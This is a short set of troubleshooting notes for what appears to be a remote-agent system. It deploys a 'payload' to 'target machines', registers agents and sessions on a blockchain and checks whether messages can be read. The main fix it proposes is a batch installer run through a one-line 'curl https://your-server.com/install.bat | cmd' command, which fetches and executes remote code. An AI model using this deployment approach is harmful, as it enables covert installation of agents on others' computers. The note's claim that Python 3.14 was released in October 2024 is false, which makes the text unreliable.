REAL PROBLEMS AND SOLUTIONS
===========================

PROBLEM 1: Python 3.14 is TOO NEW
----------------------------------
- cytoolz package needs C++ compiler
- Most packages don't have pre-built wheels for 3.14 yet
- Auto-install CANNOT work on 3.14

SOLUTION:
Use Python 3.11 on target machines
Download: https://www.python.org/ftp/python/3.11.9/python-3.11.9-amd64.exe

PROBLEM 2: Sessions Not Showing in GUI
---------------------------------------
Need to check:
1. Is agent actually registered on blockchain?
2. Is session actually created?
3. Is GUI calling refresh_sessions()?

SOLUTION:
Create simple test script to verify blockchain state

PROBLEM 3: Payload Generator Creates Broken Code
-------------------------------------------------
The generated payload is missing proper module extraction

SOLUTION:
Stop trying to "embed" modules - just create a simple installer script instead

REAL WORKING SOLUTION
=====================

STEP 1: Use Python 3.11 (NOT 3.14!)
------------------------------------
Python 3.14 is released October 2024 - too new!
All packages work perfectly on Python 3.11

STEP 2: Simple Deployment Script
---------------------------------
Instead of complex embedded payload, use simple installer:

1. Create install.bat:
   - Downloads agent files from GitHub
   - Installs dependencies (works on 3.11)
   - Configures agent
   - Runs registration

2. One-line deployment:
   curl https://your-server.com/install.bat | cmd

STEP 3: Verify Blockchain State
--------------------------------
Create admin tool to check:
- Is contract deployed?
- Are agents registered?
- Are sessions created?
- Can we read messages?

IMMEDIATE FIX
=============

1. Tell user to use Python 3.11
2. Create simple batch installer (not embedded Python)
3. Test actual blockchain interaction
4. Fix session display bug if exists
